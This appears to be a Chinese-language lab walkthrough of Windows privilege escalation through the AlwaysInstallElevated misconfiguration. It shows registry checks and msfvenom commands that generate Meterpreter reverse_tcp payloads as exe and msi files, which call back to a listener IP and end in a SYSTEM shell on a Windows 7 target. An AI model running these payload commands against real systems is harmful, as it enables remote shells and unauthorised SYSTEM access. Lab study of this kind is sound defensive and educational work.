### AlwaysInstallElevated 提权

如果 **系统管理员错误地同时开启了 HKLM 和 HKCU 的 AlwaysInstallElevated = 1**，那么：

1. **任意用户**（包括低权限普通用户）
    可以运行 `msiexec.exe /i malicious.msi`
2. 因为策略允许以 SYSTEM 权限安装 MSI，
    所以 `msiexec.exe` 会把这个恶意 MSI 包 **在 SYSTEM 权限下执行**
3. 攻击者只需构造一个恶意 MSI 包，在安装脚本中放置任意代码（例如写入管理员账户、启动反弹 shell、执行木马）
4. 结果：普通用户 → SYSTEM 提权

搭建环境，win + r 运行 `gpedit.msc`

计算机配置 –> 管理模板 –> Windows 组件 –> Windows Installer

点击“ 始终以提升的权限进行安装 ”，选择“ 已启用 ”，点击确定即可

![](https://pic1.imgdb.cn/item/68d1fab1c5157e1a8828a43f.png)

实战中只需要查看注册表中的两项值是否为 0x1 , 也就是开启状态 , 如果是开启的 , 说明存在错误配置提权漏洞

```cmd
reg query HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\installer
reg query HKEY_CURRENT_USER\software\policies\microsoft\windows\installer
```

![](https://pic1.imgdb.cn/item/68d1faf6c5157e1a8828a87d.png)

使用 MSF 生成木马远程连接

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.41.156 LPORT=8001 -f exe > AlwaysInstallElevated.exe
```

![](https://pic1.imgdb.cn/item/68d1fbf7c5157e1a8828b7ff.png)

开启 HTTP 服务

![](https://pic1.imgdb.cn/item/68d1fc10c5157e1a8828b91d.png)

靶机访问下载

![](https://pic1.imgdb.cn/item/68d1fc44c5157e1a8828bb4b.png)

使用监听模块

![](https://pic1.imgdb.cn/item/68d206a8c5157e1a8828e678.png)

配好参数开始监听

![](https://pic1.imgdb.cn/item/68d2074ec5157e1a8828ee1d.png)

Windows 7 运行上线

![](https://pic1.imgdb.cn/item/68d2079ec5157e1a8828f20d.png)

bg 放后台

![](https://pic1.imgdb.cn/item/68d207c5c5157e1a8828f3fe.png)

生成一个 msi 文件

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.41.156 lport=8445 -f msi > AlwaysInstallElevated.msi
```

![](https://pic1.imgdb.cn/item/68d2083bc5157e1a8828f944.png)

更改端口运行

![](https://pic1.imgdb.cn/item/68d208dac5157e1a88290080.png)

靶机下载上线（或者 MSF 直接传过去运行）

![](https://pic1.imgdb.cn/item/68d20906c5157e1a8829024e.png)

上线成功

![](https://pic1.imgdb.cn/item/68d209b9c5157e1a882909a0.png)

SYSTEM 权限

![](https://pic1.imgdb.cn/item/68d20a02c5157e1a88290d11.png)
